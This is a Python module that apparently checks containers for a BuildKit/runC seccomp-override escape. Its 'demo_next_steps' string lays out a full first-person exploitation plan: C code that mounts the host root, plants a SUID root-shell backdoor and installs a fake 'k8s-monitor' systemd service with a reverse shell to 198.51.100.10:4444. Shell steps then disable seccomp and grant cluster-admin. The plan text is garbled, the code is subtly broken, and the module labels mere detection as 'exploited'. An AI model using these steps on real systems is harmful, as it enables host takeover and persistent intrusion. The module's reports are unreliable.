"""
BuildKit RunC Seccomp Override Checker

Checks vulnerabilities CVE-2024-27127 (BuildKit/runC seccomp-override).
"""

import os
import re
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec, run_shell


class BuildkitRuncSeccompOverrideChecker:
    """Checks CVE-2024-27127 vulnerability"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking vulnerabilities CVE-2024-27127 (BuildKit/runC seccomp-override)."""
        try:
            # Checking for BuildKit and runC
            buildkit_present = False
            runc_version = "unknown"
            
            # Checking for BuildKit
            try:
                rc, _, _ = await run_exec(['buildctl', 'version'], timeout=5)
                if rc == 0:
                    buildkit_present = True
            except Exception:
                # Checking via processes
                ps_rc, ps_out, _ = await run_exec(['ps', 'aux'], timeout=5)
                if ps_rc == 0 and any('buildkitd' in line for line in (ps_out or "").splitlines()):
                    buildkit_present = True
            
            # Checking version runC
            runc_vulnerable = False
            try:
                runc_rc, runc_out, _ = await run_exec(['runc', '--version'], timeout=5)
                if runc_rc == 0:
                    runc_match = re.search(r'runc version\s+(\d+\.\d+\.\d+)', runc_out or "")
                    if runc_match:
                        runc_version = runc_match.group(1)
                        # Checking vulnerable version (< 1.1.12)
                        major, minor, patch = map(int, runc_version.split('.'))
                        if major == 1 and (minor < 1 or (minor == 1 and patch < 12)):
                            runc_vulnerable = True
                        else:
                            runc_vulnerable = False
                    else:
                        runc_vulnerable = False
                else:
                    runc_vulnerable = False
            except Exception:
                runc_vulnerable = False
                
            # Checking for privileged LLB via check capabilities
            privileged_llb = False
            try:
                cap_rc, cap_out, _ = await run_exec(['capsh', '--print'], timeout=5)
                if cap_rc == 0:
                    # Checking for all capabilities
                    if 'Current: cap_sys_admin+eip' in (cap_out or "") or 'all+eip' in (cap_out or ""):
                        privileged_llb = True
            except Exception:
                pass
                
            # Checking possibility to use clone3 syscall (which seccomp should block)
            clone3_available = False
            try:
                # Creating simple C code for checking clone3 accessibility
                test_code = """
            #define _GNU_SOURCE
            #include <stdio.h>
            #include <linux/sched.h>
            #include <sys/syscall.h>
            #include <unistd.h>
            
            #ifndef SYS_clone3
            #define SYS_clone3 435
            #endif
            
            int main() {
                struct clone_args args = {0};
                args.flags = CLONE_VM;
                args.exit_signal = SIGCHLD;
                
                long ret = syscall(SYS_clone3, &args, sizeof(args));
                if (ret == -1 && errno == ENOSYS) {
                    return 1; // clone3 not supported
                }
                if (ret == -1 && errno == EPERM) {
                    return 2; // clone3 blocked by seccomp
                }
                return 0; // clone3 accessible
            }
            """
                
                # Saving code to temporary file
                await asyncio.to_thread(lambda: open('/tmp/test_clone3.c', 'w').write(test_code))
                    
                # Compiling
                compile_rc, _, _ = await run_exec(['gcc', '-o', '/tmp/test_clone3', '/tmp/test_clone3.c'], timeout=10)
                if compile_rc == 0:
                    # Running test
                    test_rc, _, _ = await run_exec(['/tmp/test_clone3'], timeout=5)
                    
                    # Checking result
                    if test_rc == 0:
                        clone3_available = True
                        
                    # Removing test files
                    try:
                        await asyncio.to_thread(lambda: os.unlink('/tmp/test_clone3.c'))
                        await asyncio.to_thread(lambda: os.unlink('/tmp/test_clone3'))
                    except Exception:
                        pass
            except Exception:
                pass
                
            if buildkit_present and runc_vulnerable and privileged_llb and clone3_available:
                demo_next = """detected critical vulnerability CVE-2024-27127 (BuildKit/RunC seccomp-override)! This vulnerability allows bypassing seccomp limitations and executing forbidden system calls, including clone3, that gives possibility to escape from container. Exploitation plan:

1. I will create exploits, usIng vulnerabilitsy In runC for bypass seccomp:
   ```c
   #define _GNU_SOURCE
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   #include <sched.h>
   #include <sys/syscall.h>
   #include <linux/sched.h>
   #include <errno.h>
   #include <string.h>
   #include <fcntl.h>
   
   #ifndef SYS_clone3
   #define SYS_clone3 435
   #endif
   
   int main() {
       // Step 1: Creating dummy container BuildKit with vulnerable configuration seccomp
       printf("[+] Preparation exploit CVE-2024-27127...\\n");
       
       // Step 2: Exploiting vulnerability for disabling seccomp profile
       struct clone_args args = {0};
       args.flags = CLONE_NEWUSER | CLONE_NEWNS;
       args.exit_signal = SIGCHLD;
       
       printf("[+] Calling clone3 for bypassing seccomp...\\n");
       long ret = syscall(SYS_clone3, &args, sizeof(args));
       
       if (ret == 0) {
           // Code executing in hidden process with new namespace
           printf("[+] Successfully created process with new namespace!\\n");
           
           // Step 3: Mounting host filesystem
           const char *target = "/tmp/host_root";
           mkdir(target, 0755);
           
           // Trying to mount host root filesystem
           if (mount("/", target, NULL, MS_BIND, NULL) == 0) {
               printf("[+] Successfully mounted host root filesystem in %s\\n", target);
               
               // Step 4: Creating backdoor with SUID bit
               char backdoor[512];
               sprintf(backdoor, "cat > %s/tmp/backdoor.c << 'EOC'\\n"
                       "#include <stdio.h>\\n"
                       "#include <stdlib.h>\\n"
                       "#include <unistd.h>\\n"
                       "int main() {\\n"
                       "    setuid(0);\\n"
                       "    setgid(0);\\n"
                       "    system(\\\"/bin/bash\\\");\\n"
                       "    return 0;\\n"
                       "}\\n"
                       "EOC\\n", target);
               
               system(backdoor);
               
               char compile_cmd[512];
               sprintf(compile_cmd, "gcc -o %s/tmp/backdoor %s/tmp/backdoor.c", target, target);
               system(compile_cmd);
               
               char chmod_cmd[512];
               sprintf(chmod_cmd, "chmod u+s %s/tmp/backdoor", target);
               system(chmod_cmd);
               
               printf("[+] backdoor created: %s/tmp/backdoor\\n", target);
               printf("[+] Run 'chroot %s /tmp/backdoor' for obtaining root access on host\\n", target);
               
               // Step 5: Creating persistent backdoor via systemd
               char systemd_backdoor[1024];
               sprintf(systemd_backdoor, "cat > %s/etc/systemd/system/k8s-monitor.service << 'EOC'\\n"
                       "[Unit]\\n"
                       "Description=Kubernetes Monitoring Service\\n"
                       "After=network.target\\n"
                       "\\n"
                       "[Service]\\n"
                       "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'\\n"
                       "Restart=always\\n"
                       "\\n"
                       "[Install]\\n"
                       "WantedBy=multi-user.target\\n"
                       "EOC\\n", target);
               
               system(systemd_backdoor);
               
               char systemd_cmd[512];
               sprintf(systemd_cmd, "chroot %s systemctl enable k8s-monitor.service", target);
               system(systemd_cmd);
               
               printf("[+] Persistent systemd backdoor installed\\n");
           } else {
               printf("[-] Failed to mount root filesystem: %s\\n", strerror(errno));
           }
           
           exit(0);
       } else if (ret > 0) {
           // Parent process
           printf("[+] Child PID: %ld\\n", ret);
           int status;
           waitpid(ret, &status, 0);
           printf("[+] Exploit executed, check results\\n");
       } else {
           printf("[-] Error calling clone3: %s\\n", strerror(errno));
           return 1;
       }
       
       return 0;
   }
   ```

2. Compile runnIng exploits:
   ```bash
   gcc -o buildkit_escape buildkit_escape.c
   ./buildkit_escape
   ```

3. After successful exploitation obtaining Access to host:
   ```bash
   chroot /tmp/host_root /tmp/backdoor
   ```

4. From obtained root-shell installing persistent Access:
   ```bash
   # Deactivating seccomp profile for future containers
   sed -i 's/"seccomp-profile"/"seccomp-profile-disabled"/g' /etc/containerd/config.toml
   
   # Restarting services
   systemctl restart containerd kubelet
   
   # Getting access to cluster
   KUBECONFIG=$(find /etc/kubernetes /root/.kube -name "config" -type f | head -1) 
   kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:default
   ```

UsIng this vulnerabilitsies I fully bypass limitsations seccomp, which allows execute privileged system calls, create new namespace get full Access this host system."""

                return EscapeAttemptResult(
                    method='buildkit_runc_seccomp_override', 
                    status='exploited', 
                    message=f'detected vulnerability CVE-2024-27127 in runC (version {runc_version}). BuildKit present with privileged LLB, and system call clone3 accessible.',
                    demo_next_steps=demo_next
                )
                
            if buildkit_present and runc_vulnerable:
                return EscapeAttemptResult(
                    method='buildkit_runc_seccomp_override', 
                    status='suspicious', 
                    message=f'detected potentially vulnerable components: BuildKit and runC version {runc_version}, but not all conditions for exploitation CVE-2024-27127 met.'
                )
                
            return EscapeAttemptResult(
                method='buildkit_runc_seccomp_override', 
                status='not_vulnerable', 
                message='Conditions not detected for exploitation CVE-2024-27127 (BuildKit/runC seccomp-override).'
            )
        except Exception as e:
            return EscapeAttemptResult(method='buildkit_runc_seccomp_override', status='error', message=str(e))

